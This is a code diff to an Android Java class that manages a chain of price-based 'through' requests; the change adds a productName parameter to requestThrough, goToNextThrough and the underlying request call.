@@ -32,15 +32,15 @@ public class NormalRequestThroughManager {
         return requestThroughManager;
     }
 
-    public void requestThrough(final Context context, final String price, final String Did) {
+    public void requestThrough(final Context context, final String price, final String Did, final String productName) {
         try {
             JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
             String throughID = json.isNull("id") ? null : json.getString("id");
             if (null == throughID || throughID.equals("")) {
-                goToNextThrough(context, price, Did);
+                goToNextThrough(context, price, Did, productName);
                 return;
             }
-            ThroughRequest.getInstance().request(context, throughID, price, Did, new Subscriber<String>() {
+            ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                 @Override
                 public void onCompleted() {
                     Log.debug("request through completed!!!");
@@ -48,7 +48,7 @@ public class NormalRequestThroughManager {
 
                 @Override
                 public void onError(Throwable e) {
-                    goToNextThrough(context, price, Did);
+                    goToNextThrough(context, price, Did, productName);
                     Log.debug("request through error : " + e.getMessage().toString());
                 }
 
@@ -58,24 +58,24 @@ public class NormalRequestThroughManager {
                     requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                     if (!requestThroughCallBackEntity.getState().equals("0")) {
                         Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
-                        goToNextThrough(context, price, Did);
+                        goToNextThrough(context, price, Did, productName);
                     } else {
                         setInterceptData();
                         send(context);
-                        goToNextThrough(context, price, Did);
+                        goToNextThrough(context, price, Did, productName);
                     }
                 }
             });
         } catch (Exception e) {
             e.printStackTrace();
-            goToNextThrough(context, price, Did);
+            goToNextThrough(context, price, Did, productName);
         }
     }
 
 
-    private void goToNextThrough(Context context, String price, String Did) {
+    private void goToNextThrough(Context context, String price, String Did, String productName) {
         if (setRequestTimes() != -1) {
-            requestThrough(context, price, Did);
+            requestThrough(context, price, Did, productName);
         } else {
             return;
         }
